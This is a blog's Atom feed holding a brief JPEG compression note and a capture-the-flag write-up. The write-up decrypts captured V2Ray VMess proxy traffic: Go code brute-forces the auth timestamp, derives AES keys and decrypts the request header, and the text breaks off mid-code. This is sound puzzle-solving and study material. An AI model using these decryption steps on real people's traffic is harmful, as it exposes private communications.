<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>imK3</title>
  
  
  <link href="https://www.imfengyuan.info/atom.xml" rel="self"/>
  
  <link href="https://www.imfengyuan.info/"/>
  <updated>2022-08-03T02:36:12.533Z</updated>
  <id>https://www.imfengyuan.info/</id>
  
  <author>
    <name>imfengyuan</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://www.imfengyuan.info/2022/08/03/20220626JPEG/"/>
    <id>https://www.imfengyuan.info/2022/08/03/20220626JPEG/</id>
    <published>2022-08-03T02:36:12.533Z</published>
    <updated>2022-08-03T02:36:12.533Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JPEG-JPEG-Compression-Algorithm-（暂存）"><a href="#JPEG-JPEG-Compression-Algorithm-（暂存）" class="headerlink" title="JPEG(JPEG Compression Algorithm)（暂存）"></a>JPEG(JPEG Compression Algorithm)（暂存）</h1><ul><li>compressing at block level<ul><li>jpeg split image into 8 x 8 non-overlapping blocks</li></ul></li><li>using a suitable transform (i.e., a change of basis)<ul><li>compute the DCT(discrete cosine transform) of each block</li></ul></li><li>smart quantization<ul><li>quantize DCT coefficients according to psycovisually-tuned tables<ul><li>most coefiicients are negligible -&gt; captured by the deadzone</li></ul></li></ul></li><li>entropy coding<ul><li>run-length encoding and huffman encoding</li></ul></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2022-强网杯-Misc-部分Wp</title>
    <link href="https://www.imfengyuan.info/2022/07/31/20220731QWB/"/>
    <id>https://www.imfengyuan.info/2022/07/31/20220731QWB/</id>
    <published>2022-07-31T22:19:23.000Z</published>
    <updated>2022-07-31T22:20:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="谍影重重"><a href="#谍影重重" class="headerlink" title="谍影重重"></a>谍影重重</h1><h2 id="0x01-VMESS流量分析"><a href="#0x01-VMESS流量分析" class="headerlink" title="0x01 VMESS流量分析"></a>0x01 VMESS流量分析</h2><p>config.json 结合“境外”发现v2ray官方文档内包含默认id信息,TCP数据加密,可以猜测是v2ray使用的vmess协议</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;clients&quot;</span>: [<br>                    &#123;<br>                        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span><br>                    &#125;<br>                ]<br>&#125;<br></code></pre></td></tr></table></figure><p>握手信息:客户端(37886 ) → 服务端(10087)</p><p><img src="/../imgs/20220731/Untitled.png" alt="Untitled"></p><p>首先分析第一个314字节的包</p><p><img src="/../imgs/20220731/Untitled%201.png" alt="Untitled"></p><p>服务端必然存在解析 <strong>解析客户端发送的请求</strong>的相关代码 [目标: 修改源码为我所用]</p><blockquote><p>这是一次没有工具一波梭的流量分析, 只能利用源码为工具</p></blockquote><ol><li><p>服务端先从包中获取16字节的Auth验证信息</p><p>代码位置: <a href="https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/server.go#L128">https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/server.go#L128</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">if</span> _, err := buffer.<span class="hljs-title class_">ReadFullFrom</span>(reader, protocol.<span class="hljs-property">IDBytesLen</span>); err != nil &#123;<br><span class="hljs-keyword">return</span> nil, <span class="hljs-title function_">newError</span>(<span class="hljs-string">&quot;failed to read request header&quot;</span>).<span class="hljs-title class_">Base</span>(err)<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>验证用户,这里直接使用官方文档里给出</p><p><img src="/../imgs/20220731/Untitled%202.png" alt="Untitled"></p><p>具体对应源码见:<a href="https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/validator.go#L130">https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/validator.go#L130</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//这里有一个简约版的代码项目,只有客户端部分,编码非常容易读懂 https://github.com/gitsrc/vmess-client</span><br><span class="hljs-comment">//以及提供了很好的便捷代码</span><br>func (c *<span class="hljs-title class_">Conn</span>) <span class="hljs-title class_">EncodeAuthInfo</span>() []byte &#123;<br>ts := <span class="hljs-title function_">make</span>([]byte, <span class="hljs-number">8</span>)<br><span class="hljs-comment">//这个人写的时候为了方便,并没有随机选择秒数,但是我们根据官方源码还是需要爆破时间戳</span><br>binary.<span class="hljs-property">BigEndian</span>.<span class="hljs-title class_">PutUint64</span>(ts, <span class="hljs-title function_">uint64</span>(time.<span class="hljs-title class_">Now</span>().<span class="hljs-title function_">UTC</span>().<span class="hljs-title class_">Unix</span>())) <br>h := hmac.<span class="hljs-title class_">New</span>(md5.<span class="hljs-property">New</span>, c.<span class="hljs-property">user</span>.<span class="hljs-property">UUID</span>[:])<br>fmt.<span class="hljs-title class_">Printf</span>(<span class="hljs-string">&quot;uuid: %x \n&quot;</span>, c.<span class="hljs-property">user</span>.<span class="hljs-property">UUID</span>[:])<br>h.<span class="hljs-title class_">Write</span>(ts)<br>d := h.<span class="hljs-title class_">Sum</span>(nil)<br><span class="hljs-keyword">return</span> d<br>&#125;<br></code></pre></td></tr></table></figure><p>浅浅看一下源码就知道,后面加密都要用到<strong>时间戳,需要爆破</strong> </p><p>题目提供了用户的UUID 和 HMAC的值, 流量包里的时间也有大概的时间,找出吻合的即可.</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs jsx">func <span class="hljs-title class_">TestBreakTimeStamp</span>(t *testing.<span class="hljs-property">T</span>) &#123;<br><span class="hljs-comment">//K = 用户 ID (16 字节)</span><br><span class="hljs-keyword">var</span> uuid [<span class="hljs-number">16</span>]byte<br>s := <span class="hljs-string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span><br>b := []<span class="hljs-title function_">byte</span>(strings.<span class="hljs-title class_">Replace</span>(s, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, -<span class="hljs-number">1</span>))<br>_, _ = hex.<span class="hljs-title class_">Decode</span>(uuid[:], b)<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;uuiddd:&quot;</span>, uuid[:])<br><br><span class="hljs-comment">//HMAC 值</span><br>h := []<span class="hljs-title function_">byte</span>(<span class="hljs-string">&quot;4dd11f9b04f2b562b9db539d939f1d52&quot;</span>)<br><span class="hljs-keyword">var</span> hmacmd5 [<span class="hljs-number">16</span>]byte<br>_, _ = hex.<span class="hljs-title class_">Decode</span>(hmacmd5[:], h)<br>fmt.<span class="hljs-title class_">Println</span>(hmacmd5)<br><br><span class="hljs-comment">//M = UTC 时间，精确到秒，取值为当前时间的前后 30 秒随机值(8 字节, Big Endian)</span><br>timestamp := <span class="hljs-number">1615528962</span><br><span class="hljs-keyword">for</span> i := -<span class="hljs-number">30</span>; i &lt;= <span class="hljs-number">30</span>; i++ &#123;<br><span class="hljs-keyword">var</span> b [<span class="hljs-number">8</span>]byte<br>binary.<span class="hljs-property">BigEndian</span>.<span class="hljs-title class_">PutUint64</span>(b[:], <span class="hljs-title function_">uint64</span>(timestamp+i))<br>mac := hmac.<span class="hljs-title class_">New</span>(md5.<span class="hljs-property">New</span>, uuid[:])<br>mac.<span class="hljs-title class_">Write</span>(b[:])<br>expectedMAC := mac.<span class="hljs-title class_">Sum</span>(nil)<br><span class="hljs-keyword">for</span> index, value := range expectedMAC &#123;<br><span class="hljs-keyword">if</span> hmacmd5[index] == value &#123;<br><span class="hljs-title function_">println</span>(timestamp+i, <span class="hljs-string">&quot;的Index=&quot;</span>, index, <span class="hljs-string">&quot;吻合&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//M = UTC 时间，精确到秒，取值为当前时间的前后 30 秒随机值(8 字节, Big Endian)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>爆破得到时间戳: 1615528982</p></li><li><p>解密指令部分,依旧是源码部分,非常清晰</p><p>代码定位:<a href="https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/server.go#L137">https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/server.go#L137</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx">iv := <span class="hljs-title function_">hashTimestamp</span>(md5.<span class="hljs-title class_">New</span>(), timestamp)<br>vmessAccount := user.<span class="hljs-property">Account</span>.(*vmess.<span class="hljs-property">MemoryAccount</span>)<br>aesStream := crypto.<span class="hljs-title class_">NewAesDecryptionStream</span>(vmessAccount.<span class="hljs-property">ID</span>.<span class="hljs-title class_">CmdKey</span>(), iv[:])<br>decryptor := crypto.<span class="hljs-title class_">NewCryptionReader</span>(aesStream, reader)<br></code></pre></td></tr></table></figure><p>结合官方文档</p><p><img src="/../imgs/20220731/Untitled%203.png" alt="Untitled"></p><p>解密代码参考:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs jsx">func <span class="hljs-title class_">TestDecodeRequestHeader</span>(t *testing.<span class="hljs-property">T</span>) &#123;<br><br><span class="hljs-comment">//uuid解析</span><br><span class="hljs-keyword">var</span> uid [<span class="hljs-number">16</span>]byte<br>s := <span class="hljs-string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span><br>b := []<span class="hljs-title function_">byte</span>(strings.<span class="hljs-title class_">Replace</span>(s, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, -<span class="hljs-number">1</span>))<br>_, _ = hex.<span class="hljs-title class_">Decode</span>(uid[:], b)<br><span class="hljs-comment">//Key：MD5(用户 ID + []byte(&#x27;c48619fe-8f02-49e0-b9e9-edf763e17e21&#x27;))</span><br>md5hash1 := md5.<span class="hljs-title class_">New</span>()<br>md5hash1.<span class="hljs-title class_">Write</span>(uid[:])<br>md5hash1.<span class="hljs-title class_">Write</span>([]<span class="hljs-title function_">byte</span>(<span class="hljs-string">&quot;c48619fe-8f02-49e0-b9e9-edf763e17e21&quot;</span>))<br>key := md5hash1.<span class="hljs-title class_">Sum</span>(nil)[:]<br><span class="hljs-comment">//IV：MD5(X + X + X + X)，X = []byte(认证信息生成的时间) (8 字节, Big Endian)</span><br>md5hash := md5.<span class="hljs-title class_">New</span>()<br>ts := <span class="hljs-title function_">make</span>([]byte, <span class="hljs-number">8</span>)<br>binary.<span class="hljs-property">BigEndian</span>.<span class="hljs-title class_">PutUint64</span>(ts, <span class="hljs-title function_">uint64</span>(<span class="hljs-number">1615528982</span>))<br>fmt.<span class="hljs-title class_">Println</span>(hex.<span class="hljs-title class_">EncodeToString</span>(ts[:]))<br>md5hash.<span class="hljs-title class_">Write</span>(ts)<br>md5hash.<span class="hljs-title class_">Write</span>(ts)<br>md5hash.<span class="hljs-title class_">Write</span>(ts)<br>md5hash.<span class="hljs-title class_">Write</span>(ts)<br>iv := md5hash.<span class="hljs-title class_">Sum</span>(nil)<br><br>block, _ := aes.<span class="hljs-title class_">NewCipher</span>(key)<br>stream := cipher.<span class="hljs-title class_">NewCFBDecrypter</span>(block, iv)<br>dat, _ := os.<span class="hljs-title class_">ReadFile</span>(<span class="hljs-string">&quot;/Users/yuan/Downloads/4dd1.bin&quot;</span>) <span class="hljs-comment">//整个数据包</span><br>buf := <span class="hljs-title function_">make</span>([]byte, <span class="hljs-title function_">len</span>(dat[<span class="hljs-number">16</span>:]))<br>stream.<span class="hljs-title class_">XORKeyStream</span>(buf, dat[<span class="hljs-number">16</span>:])<br><span class="hljs-comment">//因为指令部分第一个版本号永远为1 如果版本号为：1</span><br><span class="hljs-keyword">if</span> buf[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> &#123;<br><span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;Congrats!&quot;</span>)<br>fmt.<span class="hljs-title class_">Printf</span>(<span class="hljs-string">&quot; key : %x&quot;</span>, key)<br>fmt.<span class="hljs-title class_">Printf</span>(<span class="hljs-string">&quot;iv : %x&quot;</span>, iv)<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n解密后结果：&quot;</span>, buf)<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n版本号：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]))<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n数据加密IV：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">1</span>:<span class="hljs-number">17</span>]))<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n数据加密Key：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">17</span>:<span class="hljs-number">33</span>]))<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n响应认证：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">33</span>:<span class="hljs-number">34</span>]))<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n选项：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">34</span>:<span class="hljs-number">35</span>]))<br>padingLen := <span class="hljs-title function_">int</span>(buf[<span class="hljs-number">3</span>] &gt;&gt; <span class="hljs-number">4</span>)<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\npading：&quot;</span>, padingLen)<br>enc := buf[<span class="hljs-number">35</span>] &amp; <span class="hljs-number">0x0F</span><br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n加密方式enc：&quot;</span>, enc)<br><br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n保留：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">36</span>:<span class="hljs-number">37</span>]))<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n指令：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">37</span>:<span class="hljs-number">38</span>]))<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n端口：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">38</span>:<span class="hljs-number">40</span>]))<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n地址类型：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">40</span>:<span class="hljs-number">41</span>]))<br><span class="hljs-comment">//ipv4</span><br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\n地址A：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">41</span>:<span class="hljs-number">45</span>]))<br><span class="hljs-comment">//根据padding确认为7长度</span><br><span class="hljs-comment">//余量 P：在校验值之前加入 P 字节的随机值；</span><br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\npadding：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">45</span>:<span class="hljs-number">52</span>]))<br>fmt.<span class="hljs-title class_">Println</span>(<span class="hljs-string">&quot;\nhash：&quot;</span>, hex.<span class="hljs-title class_">EncodeToString</span>(buf[<span class="hljs-number">52</span>:<span class="hljs-number">56</span>]))<br>&#125;<br><br><span class="hljs-comment">// 指令部分key : b50d916ac0cec067981af8e5f38a758f  iv : 881eb47d4d3b67b24328c5178c0eedcc</span><br><span class="hljs-comment">// 指令请求头</span><br><span class="hljs-comment">//  数据加密key : 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="hljs-comment">//  数据加密iv : 13277f5732da52ada790d87b8829daa9</span><br><span class="hljs-comment">// 响应认证：a2</span><br><span class="hljs-comment">// 加密方式enc: 3</span><br><span class="hljs-comment">// opt为0d 13 8+4+1 -&gt; 开启了三个模式,这里官方文档也没说....官方文档能不能让出题人更新一下...</span><br>  <span class="hljs-comment">// pading： 7随机值的长度</span><br><span class="hljs-comment">// 所以指令部分的长度应为: 56个字节 </span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="整理几个官方文档的说法不清晰的地方"><a href="#整理几个官方文档的说法不清晰的地方" class="headerlink" title="整理几个官方文档的说法不清晰的地方"></a>整理几个官方文档的说法不清晰的地方</h3><ol><li>关于option上面的选项值的问题.</li></ol><p><img src="/../imgs/20220731/Untitled%204.png" alt="Untitled"></p><blockquote><p>选项 ：</p><ul><li>S (0x01)：标准格式的数据流（建议开启）；</li><li>R (0x02)：客户端期待重用 TCP 连接（V2Ray 2.23+ 弃用）；<ul><li>只有当 S 开启时，这一项才有效；</li></ul></li><li>M (0x04)：开启元数据混淆（建议开启）；<ul><li>只有当 S 开启时，这一项才有效；</li><li>当其项开启时，客户端和服务器端需要分别构造两个 Shake 实例，分别为 RequestMask &#x3D; Shake(请求数据 IV), ResponseMask &#x3D; Shake(响应数据 IV)。</li></ul></li><li>X：保留</li></ul></blockquote><p>因为我们这里通过解密得出<strong>Opt</strong>的值为<strong>0d</strong> &#x3D; 13 ,显然根据文档没有这个值, 回到源码</p><p>发现这里新增了<strong>globalpadding</strong>模式 8 + 4 + 1 → 开启了三个模式 S M 和 GlobalPadding</p><p>S → 表示<strong>客户端请求的数据部分</strong>  和 <strong>服务器端的响应部分的应答数据 都是 经过标准格式 (2字节长度 + 数据)</strong></p><p>M → 元数据混淆模式 会增加一个 shake实例 (有兴趣和深入研究)</p><p><img src="/../imgs/20220731/Untitled%205.png" alt="Untitled"></p><p>b. 关于padding和数据加密方式</p><p>在通过对应官方文档解析过程中,发现完全不对应</p><p>所以回到源码,而是共用了一个字节.具体操作也可看编码过程</p><p>代码参见:<a href="https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/server.go#L166">https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/server.go#L166</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"> <br> request.<span class="hljs-property">Option</span> = bitmask.<span class="hljs-title class_">Byte</span>(buffer.<span class="hljs-title class_">Byte</span>(<span class="hljs-number">34</span>)) <span class="hljs-comment">// 1 byte</span><br> <span class="hljs-comment">//可以看到再取出Opt对应的字节之后, padingLen和Security都只用了Byte[35],这一个字节</span><br>padingLen := <span class="hljs-title function_">int</span>(buffer.<span class="hljs-title class_">Byte</span>(<span class="hljs-number">35</span>) &gt;&gt; <span class="hljs-number">4</span>)<br>request.<span class="hljs-property">Security</span> = <span class="hljs-title function_">parseSecurityType</span>(buffer.<span class="hljs-title class_">Byte</span>(<span class="hljs-number">35</span>) &amp; <span class="hljs-number">0x0F</span>)<br><span class="hljs-comment">// 1 bytes reserved</span><br>request.<span class="hljs-property">Command</span> = protocol.<span class="hljs-title class_">RequestCommand</span>(buffer.<span class="hljs-title class_">Byte</span>(<span class="hljs-number">37</span>))<br></code></pre></td></tr></table></figure><p><img src="/../imgs/20220731/Untitled%206.png" alt="Untitled"></p><p>更离谱的是,就算我们解析出来了是<strong>3</strong>,看上去可以和官方文档对应,</p><p>如果你看到官方文档,以为我们的enc值是3 是ChacCha20那你就错了….还是得回到源码确认（幸亏看了一眼）</p><blockquote><p>加密方式：指定数据部分的加密方式，可选的值有：</p><ul><li>0x00：AES-128-CFB；</li><li>0x01：不加密；</li><li>0x02：AES-128-GCM；</li><li>0x03：ChaCha20-Poly1305</li></ul></blockquote><p>源码中的 3 对应了AES128 GCM (:)</p><p><img src="/../imgs/20220731/Untitled%207.png" alt="Untitled"></p><p>所以数据部分仍旧是使用了AES-GCM进行加密</p></li><li><p>解密RequestBody数据部分</p><p>解密RequestBody当然是服务端的事情.</p><p>定位代码:<a href="https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/server.go#L212">https://github.com/v2ray/v2ray-core/blob/4b81ba947f89218ea7c99362b43beeeb5c3cf37b/proxy/vmess/encoding/server.go#L212</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//我们根据指令部分的Opt,已知 ChunkMasking和PaddingLengthGenerator 全开</span><br><br><span class="hljs-comment">//一上来先是判断你开没开 ChunkMasking 我们这里开了 所以保留一下 </span><br><span class="hljs-comment">//当其项开启时，客户端和服务器端需要分别构造两个 Shake 实例，分别为 RequestMask = Shake(请求数据 IV), ResponseMask = Shake(响应数据 IV)。</span><br><br><span class="hljs-keyword">if</span> request.<span class="hljs-property">Option</span>.<span class="hljs-title class_">Has</span>(protocol.<span class="hljs-property">RequestOptionChunkMasking</span>) &#123;<br><span class="hljs-comment">//这边要注意它使用了 requestBodyIV [ 指令部分的数据加密IV ]</span><br><span class="hljs-comment">//现在只是使用requestiv初始化了一个shake实例</span><br><br>sizeParser = <span class="hljs-title class_">NewShakeSizeParser</span>(s.**requestBodyIV[:]**)<br>&#125;<br><br><span class="hljs-comment">//跟进NewShakeSizeParser() 看一下ShakeSizeParser的结构,sha3-shake128加密</span><br>func <span class="hljs-title class_">NewShakeSizeParser</span>(nonce []byte) *<span class="hljs-title class_">ShakeSizeParser</span> &#123;<br>shake := sha3.<span class="hljs-title class_">NewShake128</span>()<br>common.<span class="hljs-title class_">Must2</span>(shake.<span class="hljs-title class_">Write</span>(nonce))<br><span class="hljs-keyword">return</span> &amp;<span class="hljs-title class_">ShakeSizeParser</span>&#123;<br><span class="hljs-attr">shake</span>: shake,<br>&#125;<br>&#125;<br><br>type <span class="hljs-title class_">ShakeSizeParser</span> struct &#123;<br>shake  sha3.<span class="hljs-property">ShakeHashfr</span><br>buffer [<span class="hljs-number">2</span>]byte<br>&#125;<br><br><span class="hljs-comment">//继续看下一个判断 一共两个判断  接下来判断时否开启GlobalPadding模式</span><br><span class="hljs-comment">//真想骂人..全开是吧...出题快乐是吧...喜欢折磨人是吧...谢谢您嘞</span><br><span class="hljs-keyword">var</span> padding crypto.<span class="hljs-property">PaddingLengthGenerator</span><br><span class="hljs-keyword">if</span> request.<span class="hljs-property">Option</span>.<span class="hljs-title class_">Has</span>(protocol.<span class="hljs-property">RequestOptionGlobalPadding</span>) &#123;<br><span class="hljs-comment">//这部分写的比较难以理解,</span><br>padding = sizeParser.(crypto.<span class="hljs-property">PaddingLengthGenerator</span>)<br>&#125;<br><br><span class="hljs-comment">//这里数据加密为GCM 根据</span><br><span class="hljs-keyword">case</span> protocol.<span class="hljs-property">SecurityType_AES128_GCM</span>:<br><span class="hljs-comment">//使用了requestBodyKey [ 指令部分的数据加密Key ]</span><br>aead := crypto.<span class="hljs-title class_">NewAesGcm</span>(**s.<span class="hljs-property">requestBodyKey</span>[:]**)<br><br>auth := &amp;crypto.<span class="hljs-property">AEADAuthenticator</span>&#123;<br><span class="hljs-attr">AEAD</span>:                    aead,<br><span class="hljs-title class_">NonceGenerator</span>:          <span class="hljs-title class_">GenerateChunkNonce</span>(s.**requestBodyIV[:]**, <span class="hljs-title function_">uint32</span>(aead.<span class="hljs-title class_">NonceSize</span>())),<br><span class="hljs-comment">// NonceSize returns the size of the nonce that must be passed to Seal</span><br><span class="hljs-comment">// and Open.</span><br><span class="hljs-title class_">AdditionalDataGenerator</span>: crypto.<span class="hljs-title class_">GenerateEmptyBytes</span>(),<br>&#125;<br><br><span class="hljs-keyword">return</span> crypto.<span class="hljs-title class_">NewAuthenticationReader</span>(auth, sizeParser, reader, **request.<span class="hljs-property">Command</span>.<span class="hljs-title class_">TransferType</span>()**, padding)<br><br><span class="hljs-comment">//官方文档描述: AES-128-GCM：Key 为指令部分的 Key，IV = count (2 字节) + IV (10 字节)。count 从 0 开始递增，每个数据包加 1；IV 为 指令部分 IV 的第 3 至第 12 字节。</span><br><br>func <span class="hljs-title class_">NewAuthenticationReader</span>(auth <span class="hljs-title class_">Authenticator</span>, sizeParser <span class="hljs-title class_">ChunkSizeDecoder</span>, reader io.<span 